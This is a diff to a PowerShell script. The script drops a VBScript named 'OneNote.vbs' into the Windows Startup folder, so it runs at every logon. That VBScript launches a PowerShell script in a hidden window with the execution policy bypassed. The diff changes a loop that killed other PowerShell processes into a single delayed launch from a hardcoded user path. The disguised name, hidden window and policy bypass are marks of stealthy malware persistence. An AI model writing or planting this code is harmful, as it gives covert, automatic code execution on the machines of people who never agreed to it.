@@ -65,48 +65,21 @@ $startupFolder = [System.Environment]::GetFolderPath([System.Environment+Special
 
 $batchScriptPath = Join-Path $startupFolder "OneNote.vbs"
 $batchCode = @"
-Function IsProcessRunning(processName)
-    Dim objWMIService, colProcesses, objProcess
-    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '" & processName & "'")
-    IsProcessRunning = False
-    For Each objProcess in colProcesses
-        IsProcessRunning = True
-    Next
-End Function
-
-' Function to terminate a process
-Sub TerminateProcess(processName)
-    Dim objWMIService, colProcesses, objProcess
-    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '" & processName & "'")
-    For Each objProcess in colProcesses
-        objProcess.Terminate()
-    Next
-End Sub
-
 ' Create a Shell object
 Set objShell = CreateObject("WScript.Shell")
 
+
+WScript.Sleep 5000
+
 ' Path to the PowerShell script comons
-scriptPath = "$scriptPath"
+scriptPath = "C:\Users\imgf\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\script.ps1"
 
-Do
-    ' Check if PowerShell process is running and terminate it if necessary
-    If IsProcessRunning("powershell.exe") Then
-        TerminateProcess("powershell.exe")
-    End If
 
-    ' Command to run PowerShell script in hidden mode
-    command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & scriptPath & """"
+' Command to run PowerShell script in hidden mode
+command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & scriptPath & """"
 
-    ' Execute the command and capture return value
-    returnValue = objShell.Run(command, 0, True)
-
-    ' Wait for a moment before checking if the process is still running
-    WScript.Sleep 5000
-
-Loop
+' Execute the command and capture return value
+returnValue = objShell.Run(command, 0, True)
 "@
 $batchCode | Out-File -FilePath $batchScriptPath -Encoding ascii
 
